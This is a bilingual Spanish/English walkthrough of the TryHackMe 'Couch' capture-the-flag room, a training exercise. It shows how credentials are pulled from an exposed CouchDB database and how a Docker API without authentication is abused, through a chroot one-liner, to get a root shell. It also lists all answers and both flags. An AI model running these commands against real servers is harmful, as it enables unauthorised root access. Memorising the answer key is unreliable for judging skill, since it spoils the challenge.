# Couch [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** CTF (Free)
* **Slug:** `couch`
* **Link:** https://tryhackme.com/room/couch
* **Sección / Section:** CTF / Máquinas
* **Fuente / Source:** Writeup de Nandu (0xrodon, Medium) + k4713 (Medium) + hatamirais (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Hackea un servidor de base de datos vulnerable (CouchDB) que almacena datos en formato de documentos JSON. Es un reto semi-guiado. Se explota CouchDB para obtener credenciales SSH, luego se escala privilegios abusando de la API de Docker.
> **EN:** Hack into a vulnerable database server (CouchDB) that stores data in JSON-based document formats, in this semi-guided challenge. Exploit CouchDB to get SSH credentials, then escalate privileges by abusing the Docker API.

---

### Escaneo / Scanning

Escaneo de puertos con nmap (el escaneo normal solo muestra 1 puerto, usar RustScan para ver todos):

```
rustscan -a MACHINE_IP
```

```
Open 10.10.75.191:22
Open 10.10.75.191:5984
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Scan the machine. How many ports are open? | `2` |
| What is the database management system installed on the server? | `couchdb` |
| What port is the database management system running on? | `5984` |
| What is the version of the management system installed on the server? | `1.6.1` |

El puerto 22 es SSH y el 5984 es CouchDB. Acceder a CouchDB:

```
curl http://MACHINE_IP:5984
```

Devuelve la versión (1.6.1) y el OS (Ubuntu 16.04).

---

### Explotación de CouchDB / CouchDB Exploitation

CouchDB tiene una interfaz de administración web llamada **Fauxton**:

```
http://MACHINE_IP:5984/_utils/#/dashboard
```

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the path for the web administration tool for this database management system? | `_utils` |
| What is the path to list all databases in the web browser of the database management system? | `_all_dbs` |

En la base de datos secreta, en el documento con id `a1320dd69fb4570d0a3d26df4e000be7`, hay un campo `passwordbackup` con las credenciales SSH:

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What are the credentials found in the web administration tool? | `atena:t4qfzcc4qN##` |

---

### Acceso SSH / SSH Access

Con las credenciales, conectarse por SSH:

```
ssh atena@MACHINE_IP
```

En el directorio home está `user.txt`:

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Compromise the machine and locate user.txt | `THM{1ns3cure_couchdb}` |

> **Flag user:** `THM{1ns3cure_couchdb}` — "insecure couchdb" (couchdb inseguro).

---

### Escalada de privilegios / Privilege Escalation

Revisar `.bash_history` y `netstat` para descubrir que estamos en un contenedor Docker y que hay un puerto Docker API en `127.0.0.1:2375`:

```
netstat -lnt
```

```
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN
```

Hacer port forwarding del puerto 2375 a nuestra máquina local:

```
ssh -L 2375:127.0.0.1:2375 atena@MACHINE_IP
```

Escanear el puerto local y explotar la API de Docker sin autenticación para montar el filesystem raíz del host en un contenedor:

```
docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

Esto da una shell como root en el host. Leer `root.txt`:

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Escalate privileges and obtain root.txt | `THM{RCE_us1ng_Docker_API}` |

> **Flag root:** `THM{RCE_us1ng_Docker_API}` — "RCE using Docker API" (ejecución remota de código usando la API de Docker).

---

## Metodología / Methodology

1. **Recon:** escaneo de puertos (RustScan revela 22 y 5984; nmap normal solo muestra 22).
2. **Enumeración:** CouchDB 1.6.1 en el puerto 5984; interfaz Fauxton en `/_utils`.
3. **Credenciales:** en la base de datos secreta, campo `passwordbackup` → `atena:t4qfzcc4qN##`.
4. **Foothold:** SSH con las credenciales → `user.txt` (`THM{1ns3cure_couchdb}`).
5. **Privesc:** descubrir la API de Docker sin autenticación en `127.0.0.1:2375`, port forward, y abusar de ella para montar `/` del host → root → `root.txt` (`THM{RCE_us1ng_Docker_API}`).

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
